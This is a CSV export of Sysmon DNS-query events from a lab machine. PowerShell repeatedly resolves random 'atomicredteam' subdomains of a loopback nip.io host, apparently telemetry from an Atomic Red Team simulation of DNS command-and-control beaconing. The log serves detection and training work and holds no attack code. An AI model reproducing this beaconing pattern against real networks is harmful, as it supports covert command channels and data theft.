"2025-12-26 11:27:08.507 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174341,"Query: atomicredteam-207810.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:07.810","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:08.507 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174342,"Query: atomicredteam-315226.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:07.851","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:08.507 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174343,"Query: atomicredteam-6269.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:07.888","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:08.507 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174344,"Query: atomicredteam-897555.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:07.936","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:08.507 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174345,"Query: atomicredteam-828643.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:07.973","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:08.507 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174346,"Query: atomicredteam-487987.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.016","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:08.507 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174347,"Query: atomicredteam-139314.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.054","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:08.507 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174348,"Query: atomicredteam-388203.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.095","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:08.507 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174349,"Query: atomicredteam-516078.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.135","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:08.507 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174350,"Query: atomicredteam-320551.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.184","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:08.514 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174351,"Query: atomicredteam-810817.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.227","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:08.514 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174352,"Query: atomicredteam-476595.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.421","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:09.521 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174353,"Query: atomicredteam-683307.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.460","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:09.522 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174354,"Query: atomicredteam-640655.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.507","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:09.522 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174355,"Query: atomicredteam-106197.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.546","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:09.522 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174356,"Query: atomicredteam-744202.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.584","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:09.522 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174357,"Query: atomicredteam-37009.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.622","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:09.522 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174358,"Query: atomicredteam-476360.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.660","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:09.523 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174359,"Query: atomicredteam-960311.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.702","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:09.523 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174360,"Query: atomicredteam-784716.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.743","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:09.523 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174361,"Query: atomicredteam-666925.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.781","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:09.523 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174362,"Query: atomicredteam-705481.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.836","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:09.524 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174363,"Query: atomicredteam-683316.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.891","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:09.524 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174364,"Query: atomicredteam-58847.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:08.951","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:09.524 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174365,"Query: atomicredteam-289541.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:09.033","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:09.525 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174366,"Query: atomicredteam-408858.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:09.079","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:09.525 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174367,"Query: atomicredteam-734723.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:09.170","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:10.520 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174368,"Query: atomicredteam-660564.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:09.386","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:10.520 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174369,"Query: atomicredteam-702023.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:09.473","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:10.520 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174370,"Query: atomicredteam-512419.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:09.525","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:10.520 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174371,"Query: atomicredteam-728658.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:09.693","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:10.520 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174372,"Query: atomicredteam-531765.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:09.736","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:10.520 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174373,"Query: atomicredteam-870571.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:09.794","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:10.520 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174374,"Query: atomicredteam-379890.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:09.987","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:10.520 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174375,"Query: atomicredteam-24143.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:10.041","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:10.520 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174376,"Query: atomicredteam-247363.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:10.104","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:10.520 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174377,"Query: atomicredteam-134330.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:10.151","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:11.547 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174378,"Query: atomicredteam-883233.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:10.476","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:11.551 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174379,"Query: atomicredteam-804523.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:10.518","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:11.552 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174380,"Query: atomicredteam-421293.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:10.697","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:11.552 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174381,"Query: atomicredteam-733983.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:10.741","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:11.553 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174382,"Query: atomicredteam-401209.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.066","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:11.570 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174383,"Query: atomicredteam-352945.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.105","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:11.570 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174384,"Query: atomicredteam-759937.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.143","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:11.570 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174385,"Query: atomicredteam-404784.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.182","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:11.570 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174386,"Query: atomicredteam-11502.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.221","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:11.570 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174387,"Query: atomicredteam-754881.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.260","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:11.570 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174388,"Query: atomicredteam-640194.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:11.298","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
